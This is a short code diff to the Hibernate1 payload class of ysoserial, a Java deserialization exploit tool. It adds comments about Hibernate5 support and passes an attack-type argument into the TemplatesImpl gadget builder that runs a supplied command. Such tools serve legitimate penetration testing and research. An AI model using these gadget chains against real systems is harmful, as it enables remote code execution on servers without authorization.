@@ -41,6 +41,9 @@ import ysoserial.payloads.util.Reflections;
  */
 @Authors({ Authors.MBECHLER })
 public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
+	
+	// federicodotta - All supported (templateImpl) only with Hibernate5. Hibernate4 can only call getter.
+	// Add profile hibernate5 to compile with Maven and run ysoserial with -Dhibernate5 for using with Hibernate 5. 
 
     public static String[] getDependencies () {
         if ( System.getProperty("hibernate5") != null ) {
@@ -100,7 +103,7 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
 
 
     public Object getObject ( String command, String attackType) throws Exception {
-        Object tpl = Gadgets.createTemplatesImpl(command);
+        Object tpl = Gadgets.createTemplatesImpl(command, attackType);
         Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
         return makeCaller(tpl, getters);
     }
